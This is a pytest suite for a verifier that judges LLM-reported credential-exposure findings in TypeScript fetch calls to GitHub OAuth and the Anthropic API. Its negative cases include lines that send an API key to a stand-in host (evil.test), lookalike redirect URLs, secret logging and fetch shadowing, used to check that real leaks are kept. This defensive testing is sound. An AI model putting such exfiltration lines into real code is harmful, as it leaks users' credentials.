"""No-runtime source boundaries for rejecting credential-transport-only penalties."""

import hashlib
import io
import json
import stat
import zipfile

import pytest

from app.scan import credential_transport_assessment as c

PATH = "app/api/chat/route.ts"
GITHUB_TITLE = "GitHub OAuth client_secret exposed in server-side fetch"
ANTHROPIC_TITLE = "Anthropic API key transmitted in fetch request headers"
GITHUB = """export async function POST(req) {
 const secret = process.env.GITHUB_OAUTH_CLIENT_SECRET;
 if (!secret) return null;
 const response = await fetch('https://github.com/login/oauth/access_token', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({client_id: 'PRIVATE_ID', client_secret: secret, code: req.code})
 });
 return response;
}"""
ANTHROPIC = """export async function POST(req) {
 const response = await fetch('https://api.anthropic.com/v1/messages', {
  method: 'POST',
  headers: {'x-api-key': process.env.ANTHROPIC_API_KEY!, 'Content-Type': 'application/json'},
  body: JSON.stringify({messages: req.messages})
 });
 return response;
}"""
PROXY = """import { ProxyAgent, type Dispatcher } from 'undici';
let agent: Dispatcher | undefined;
let resolved = false;
export function anthropicDispatcher(): Dispatcher | undefined {
 if (!resolved) {
  const url = process.env.ANTHROPIC_PROXY_URL;
  if (url) agent = new ProxyAgent(url);
  resolved = true;
 }
 return agent;
}"""
WRAPPER = """async function fetchWithTimeout(url: string, init: RequestInit & {timeout?: number}) {
 const timeout = init.timeout ?? TIMEOUT_MS;
 const controller = new AbortController();
 const timer = setTimeout(() => controller.abort(), timeout);
 const dispatcher = url.startsWith('https://api.anthropic.com') ? anthropicDispatcher() : undefined;
 try {
  const res = await fetch(url, { ...init, signal: controller.signal, dispatcher } as RequestInit);
  return res;
 } finally { clearTimeout(timer); }
}
"""
PROXY_HEADER = "import { anthropicDispatcher } from '../../../lib/dispatcher';\n"


def archive(sources):
    stream = io.BytesIO()
    with zipfile.ZipFile(stream, "w", compression=zipfile.ZIP_DEFLATED) as z:
        for path, value in sources.items():
            z.writestr(path, value)
    return stream


def raw(source, title=GITHUB_TITLE, path=PATH, **extra):
    lines = source.splitlines()
    start = next(i for i, line in enumerate(lines, 1) if "const response =" in line)
    return {"file": path, "line_start": start, "line_end": start + 3, "title": title, "source": "llm", **extra}


def assess(source=GITHUB, *, finding=None, extra=None, path=PATH):
    title = ANTHROPIC_TITLE if isinstance(source, str) and "x-api-key" in source else GITHUB_TITLE
    verifier = c.CredentialTransportVerifier(archive({path: source, **(extra or {})}))
    return verifier.checks_for(finding or raw(source, title, path))


def unsupported(records):
    return [r for r in records if r["result"] == "unsupported" and r["whole_finding"] is True]


def test_direct_server_oauth_body_has_bound_credential_and_neutral_consequence_assessment():
    (record,) = unsupported(assess())
    assert record["method"] == "source_ast"
    assert record["kind"] == c.KIND
    assert record["source_sha256"] == hashlib.sha256(GITHUB.encode()).hexdigest()
    binding = record["source_binding"]
    assert binding["authentication_position"] == "oauth_token_body"
    assert GITHUB.encode()[slice(*binding["credential_position"]["span"])] == b"secret"
    assert binding["transport"]["invocation"] == "direct_fetch"
    assert "not verified safety" in record["detail"]
    assert "PRIVATE_ID" not in json.dumps(record)
    assert "GITHUB_OAUTH_CLIENT_SECRET" not in json.dumps(record)


def test_direct_anthropic_header_is_not_treated_as_plaintext_wire_leak():
    finding = raw(ANTHROPIC, ANTHROPIC_TITLE, explanation="If middleware logs headers, the key could be exposed.")
    (record,) = unsupported(assess(ANTHROPIC, finding=finding))
    assert record["source_binding"]["authentication_position"] == "provider_auth_header"
    assert "runtime transport" in record["detail"].lower()


@pytest.mark.parametrize("provider", [GITHUB, ANTHROPIC])
@pytest.mark.parametrize(
    "mutation",
    [
        "const fetch = steal;",
        "function fetch(...args) { return steal(args); }",
        "const process = shim;",
        "const JSON = shim;",
        "fetch = steal;",
        "JSON.stringify = steal;",
        "const leak = fetch;",
        "const leak = JSON;",
        "Object.assign(JSON, replacement);",
        "Object.defineProperty(process.env, 'PRIVATE', {});",
        "const alias = process.env;",
        "globalThis.fetch = steal;",
        "eval(source);",
        "const f = Function(source);",
        r"const f\u0065tch = steal;",
    ],
)
def test_visible_shadows_mutations_and_builtin_escapes_abstain(provider, mutation):
    source = provider.replace(" const response", " " + mutation + "\n const response")
    assert not unsupported(assess(source))


@pytest.mark.parametrize(
    "destination",
    [
        "http://github.com/login/oauth/access_token",
        "https://github.com.evil.test/login/oauth/access_token",
        "https://github.com@evil.test/login/oauth/access_token",
        "https://github.com/login/oauth/access_token?secret=PRIVATE_SECRET",
        "https://github.com/login/oauth/access_token#fragment",
        "https://github.com:8443/login/oauth/access_token",
        "https://api.anthropic.com/v1/messages",
    ],
)
def test_wrong_or_noncanonical_destination_cannot_suppress_oauth(destination):
    assert not unsupported(assess(GITHUB.replace(c._ENDPOINTS["github_oauth"], destination)))


@pytest.mark.parametrize(
    "expression", ["req.url", "ENDPOINT", "new URL(req.url)", "`https://github.com/${req.path}`", "endpoint()"]
)
def test_dynamic_destination_abstains(expression):
    assert not unsupported(assess(GITHUB.replace("'https://github.com/login/oauth/access_token'", expression)))


@pytest.mark.parametrize(
    "old,new",
    [
        ("method: 'POST'", "method: 'GET'"),
        ("client_secret: secret", "secret: secret"),
        ("client_secret: secret", "client_secret: secret, client_secret: other"),
        ("client_secret: secret", "client_secret: secret, ...overrides"),
        ("client_secret: secret", "client_secret: 'PRIVATE_SECRET'"),
        ("client_secret: secret", "client_secret: req.secret"),
        ("headers: {'Content-Type': 'application/json'}", "headers: customHeaders"),
        (
            "headers: {'Content-Type': 'application/json'}",
            "headers: {'Content-Type': 'application/json', 'content-type': other}",
        ),
        ("const secret", "let secret"),
        ("process.env.GITHUB_OAUTH_CLIENT_SECRET", "process.env.NEXT_PUBLIC_GITHUB_CLIENT_SECRET"),
        ("method: 'POST'", "...options, method: 'POST'"),
        ("method: 'POST'", "method: 'POST', dispatcher: unknown()"),
        ("method: 'POST'", "method: 'POST', agent: proxy"),
    ],
)
def test_request_auth_position_ambiguity_or_unknown_transport_abstains(old, new):
    assert not unsupported(assess(GITHUB.replace(old, new)))


@pytest.mark.parametrize(
    "statement",
    [
        "console.log(secret);",
        "logger.debug({secret});",
        "send(secret);",
        "const alias = secret;",
        "return secret;",
        "await fetch(req.url, {body: secret});",
        "secret = other;",
        "console.log(process.env.GITHUB_OAUTH_CLIENT_SECRET);",
    ],
)
def test_actual_credential_escape_anywhere_keeps_the_finding(statement):
    source = GITHUB.replace(" const response", " " + statement + "\n const response")
    assert not unsupported(assess(source))


@pytest.mark.parametrize(
    "statement",
    [
        "console.log(process.env.ANTHROPIC_API_KEY);",
        "const extra = process.env.ANTHROPIC_API_KEY; console.log(extra);",
        "await fetch('https://evil.test', {body: process.env.ANTHROPIC_API_KEY});",
        "const alias = process.env;",
    ],
)
def test_real_leak_alongside_provider_authentication_is_retained(statement):
    assert not unsupported(assess(ANTHROPIC.replace(" return response;", statement + "\n return response;")))


@pytest.mark.parametrize(
    "explanation",
    [
        "The key is also logged by middleware.",
        "Middleware logs all headers.",
        "The key is written to a database.",
        "A separate authorization bypass leaks credentials.",
        "The key reaches attacker-controlled infrastructure.",
        "console.log(headers) exposes this key.",
        "It is currently exposed to the browser.",
        "It is hardcoded in source.",
    ],
)
def test_compound_or_concrete_independent_leak_narrative_is_not_dismissed(explanation):
    records = assess(ANTHROPIC, finding=raw(ANTHROPIC, ANTHROPIC_TITLE, explanation=explanation))
    assert not unsupported(records)
    assert records[0]["whole_finding"] is False


def test_model_disposition_fields_never_authorize_source_assessment():
    finding = raw(GITHUB.replace("client_secret: secret", "client_secret: req.secret"))
    finding.update(whole_finding=True, result="unsupported", verification_status="verified")
    assert not unsupported(
        assess(GITHUB.replace("client_secret: secret", "client_secret: req.secret"), finding=finding)
    )


@pytest.mark.parametrize(
    "header,path",
    [
        ("'use client';\n", PATH),
        ("", "components/widget.tsx"),
        ("", "lib/provider.ts"),
    ],
)
def test_client_or_shared_module_is_not_declared_server_only(header, path):
    source = header + ANTHROPIC
    records = assess(source, path=path)
    assert not unsupported(records)
    assert "Server-only" in records[0]["detail"]


@pytest.mark.parametrize("header", ["'use server';\n", "import 'server-only';\n"])
def test_explicit_server_only_module_marker_is_supported(header):
    assert unsupported(assess(header + ANTHROPIC, path="lib/provider.ts"))


def test_unrelated_cited_statement_does_not_borrow_a_nearby_safe_request():
    finding = raw(GITHUB)
    finding.update(line_start=9, line_end=9)
    assert not unsupported(assess(finding=finding))


def test_two_cited_operations_are_ambiguous():
    source = GITHUB.replace(
        " return response;", GITHUB[GITHUB.index(" const response") : GITHUB.index(" return response;")]
    )
    finding = raw(source)
    finding["line_end"] = len(source.splitlines())
    assert not unsupported(assess(source, finding=finding))


def proxy_source(wrapper=False):
    source = ANTHROPIC
    if wrapper:
        source = WRAPPER + source.replace("await fetch(", "await fetchWithTimeout(")
    else:
        source = source.replace("method: 'POST',", "method: 'POST', dispatcher: anthropicDispatcher(),")
    return PROXY_HEADER + source


@pytest.mark.parametrize("wrapper", [False, True])
def test_known_env_proxy_factory_is_source_context_not_proxy_safety(wrapper):
    source = proxy_source(wrapper)
    (record,) = unsupported(assess(source, extra={"lib/dispatcher.ts": PROXY}))
    proxy = record["source_binding"]["transport"]["proxy_factory"]
    assert proxy["source_sha256"] == hashlib.sha256(PROXY.encode()).hexdigest()
    assert proxy["configuration_source"] == "private_environment"
    for field in ("proxy_configuration", "proxy_logging", "runtime_routing", "runtime_module_identity"):
        assert proxy[field] == "not_checked"
    assert "ANTHROPIC_PROXY_URL" not in json.dumps(record)


@pytest.mark.parametrize(
    "old,new",
    [
        ("return agent;", "console.log(agent); return agent;"),
        ("const url = process.env.ANTHROPIC_PROXY_URL", "const url = req.url"),
        ("new ProxyAgent(url)", "new ProxyAgent({uri: url, requestTls: {rejectUnauthorized: false}})"),
        ("from 'undici'", "from 'private-package'"),
        ("let agent:", "const ProxyAgent = intercept; let agent:"),
        ("resolved = true;", "resolved = true; inspectHeaders();"),
        ("return agent;", "return alternate;"),
    ],
)
def test_changed_or_untrusted_proxy_factory_keeps_review_required(old, new):
    assert not unsupported(assess(proxy_source(True), extra={"lib/dispatcher.ts": PROXY.replace(old, new)}))


@pytest.mark.parametrize(
    "old,new",
    [
        ("const timeout =", "console.log(init); const timeout ="),
        ("fetch(url,", "fetch('https://evil.test',"),
        ("...init, signal", "...init, body: steal(init), signal"),
        ("...init, signal", "...other, signal"),
        ("clearTimeout(timer);", "clearTimeout(timer); leak(init);"),
        ("return res;", "return debug(res, init);"),
        ("controller.abort()", "intercept(init)"),
    ],
)
def test_wrapper_body_must_preserve_destination_and_auth_options_without_extra_effects(old, new):
    source = proxy_source(True).replace(old, new)
    assert not unsupported(assess(source, extra={"lib/dispatcher.ts": PROXY}))


def test_named_wrapper_variant_return_await_and_constant_destination():
    source = (
        proxy_source(True)
        .replace(
            "const res = await fetch(url, { ...init, signal: controller.signal, dispatcher } as RequestInit);\n"
            "  return res;",
            "return await fetch(url, { ...init, signal: controller.signal, dispatcher } as RequestInit);",
        )
        .replace("await fetchWithTimeout('https://api.anthropic.com/v1/messages',", "await fetchWithTimeout(ENDPOINT,")
    )
    source = "const ENDPOINT = 'https://api.anthropic.com/v1/messages';\n" + source
    assert unsupported(assess(source, extra={"lib/dispatcher.ts": PROXY}))


def test_failed_source_resolution_cannot_invent_a_safe_dispatcher():
    assert not unsupported(assess(proxy_source(True)))
    assert not unsupported(assess(proxy_source(True), extra={"lib/dispatcher.ts": PROXY, "lib/dispatcher.js": PROXY}))


def test_archive_duplicate_and_symlink_paths_abstain():
    duplicate = io.BytesIO()
    with pytest.warns(UserWarning), zipfile.ZipFile(duplicate, "w") as z:
        z.writestr(PATH, GITHUB)
        z.writestr(PATH, GITHUB)
    assert not unsupported(c.CredentialTransportVerifier(duplicate).checks_for(raw(GITHUB)))
    symlink = io.BytesIO()
    with zipfile.ZipFile(symlink, "w") as z:
        info = zipfile.ZipInfo(PATH)
        info.create_system = 3
        info.external_attr = (stat.S_IFLNK | 0o777) << 16
        z.writestr(info, GITHUB)
    assert not unsupported(c.CredentialTransportVerifier(symlink).checks_for(raw(GITHUB)))


@pytest.mark.parametrize(
    "path", ["../route.ts", "/app/api/chat/route.ts", "app//api/example/route.ts", "tests/route.ts"]
)
def test_unsafe_and_nonproduction_paths_abstain(path):
    assert not unsupported(assess(path=path))


def test_parse_error_invalid_utf8_and_oversized_source_abstain():
    for source in [GITHUB + "{", GITHUB.encode() + b"\xff", GITHUB + " " * c.imported.MAX_FILE_BYTES]:
        assert not unsupported(assess(source, finding=raw(GITHUB)))


def test_archive_node_call_and_check_budgets_fail_closed(monkeypatch):
    for module, name in [
        (c.imported, "MAX_ARCHIVE_ENTRIES"),
        (c.imported, "MAX_NODES"),
        (c, "MAX_CALLS"),
        (c, "MAX_WORK_NODES"),
        (c, "MAX_CHECKS"),
    ]:
        with monkeypatch.context() as patch:
            patch.setattr(module, name, 0)
            assert not unsupported(assess())


def test_results_are_defensive_copies_and_compound_narrative_changes_cache_key():
    verifier = c.CredentialTransportVerifier(archive({PATH: GITHUB}))
    finding = raw(GITHUB)
    first = verifier.checks_for(finding)
    first[0]["source_binding"]["provider"] = "changed"
    assert verifier.checks_for(finding)[0]["source_binding"]["provider"] == "github_oauth"
    compound = {**finding, "explanation": "The credential is also logged."}
    assert not unsupported(verifier.checks_for(compound))


def test_statics_unrelated_titles_and_unbounded_narratives_are_not_suppressed():
    for update in [{"source": "static"}, {"title": GITHUB_TITLE + " and logged"}, {"title": "API key leaked"}]:
        assert not unsupported(assess(finding={**raw(GITHUB), **update}))
    assert not unsupported(assess(finding={**raw(GITHUB), "explanation": "X" * (c.MAX_NARRATIVE + 1)}))


def test_generic_risk_comparison_does_not_claim_a_demonstrated_sink():
    finding = raw(
        ANTHROPIC,
        ANTHROPIC_TITLE,
        explanation=(
            "The key is transmitted in the x-api-key header. "
            "This is a third instance of the same pattern and poses the same risk of "
            "API key exposure through logging or interception."
        ),
    )
    assert unsupported(assess(ANTHROPIC, finding=finding))
    finding["explanation"] += " The logger actually records this credential."
    assert not unsupported(assess(ANTHROPIC, finding=finding))


@pytest.mark.parametrize(
    "mutation",
    [
        "Object.prototype.toJSON = intercept;",
        "Reflect.set(process, 'env', other);",
        "const alias = secret; console.log({alias});",
        "logger.info({nested: {secret}});",
    ],
)
def test_prototype_mutation_and_nested_shorthand_escape_are_retained(mutation):
    assert not unsupported(assess(GITHUB.replace(" const response", mutation + "\n const response")))


def test_exported_credential_alias_is_a_distinct_source_escape():
    source = "export const secret = process.env.GITHUB_OAUTH_CLIENT_SECRET;\n" + GITHUB.replace(
        " const secret = process.env.GITHUB_OAUTH_CLIENT_SECRET;\n", ""
    )
    assert not unsupported(assess(source))


def test_shared_library_keeps_proxy_observations_without_asserting_server_execution():
    source = proxy_source(True).replace("../../../lib/dispatcher", "./dispatcher")
    (record,) = assess(source, path="lib/provider.ts", extra={"lib/dispatcher.ts": PROXY})
    assert record["result"] == "not_checked" and record["whole_finding"] is False
    assert record["source_binding"]["transport"]["invocation"] == "local_timeout_wrapper"


def test_read_and_aggregate_byte_budgets_abstain(monkeypatch):
    for name in ("MAX_FILES", "MAX_TOTAL_BYTES", "MAX_TOTAL_NODES"):
        with monkeypatch.context() as patch:
            patch.setattr(c.imported, name, 0)
            assert not unsupported(assess())


def test_proxy_source_with_client_marker_or_missing_module_mapping_is_not_trusted():
    assert not unsupported(assess(proxy_source(), extra={"lib/dispatcher.ts": "'use client';\n" + PROXY}))
    assert not unsupported(
        assess(
            proxy_source().replace("../../../lib/dispatcher", "@/lib/dispatcher"), extra={"lib/dispatcher.ts": PROXY}
        )
    )


def test_explicit_literal_path_mapping_binds_exact_proxy_source():
    source = proxy_source().replace("../../../lib/dispatcher", "@/lib/dispatcher")
    config = json.dumps({"compilerOptions": {"baseUrl": ".", "paths": {"@/*": ["./*"]}}})
    (record,) = unsupported(assess(source, extra={"lib/dispatcher.ts": PROXY, "tsconfig.json": config}))
    resolution = record["source_binding"]["transport"]["proxy_factory"]["resolution"]
    assert resolution["configuration"]["source_sha256"] == hashlib.sha256(config.encode()).hexdigest()


@pytest.mark.parametrize(
    "statement",
    [
        "console.info(process.env['ANTHROPIC_API_KEY']);",
        "console.info(process['env'].ANTHROPIC_API_KEY);",
        "console.info(process.env[key]);",
        "const { ANTHROPIC_API_KEY } = process.env; console.info(ANTHROPIC_API_KEY);",
    ],
)
def test_computed_or_destructured_credential_access_alongside_auth_abstains(statement):
    source = ANTHROPIC.replace(" const response", statement + "\n const response")
    assert not unsupported(assess(source))


@pytest.mark.parametrize(
    "condition", ["secret === send(secret)", "secret || send(secret)", "secret === record({secret})"]
)
def test_credential_call_inside_boolean_condition_is_not_a_plain_guard(condition):
    source = GITHUB.replace("if (!secret)", f"if ({condition})")
    assert not unsupported(assess(source))
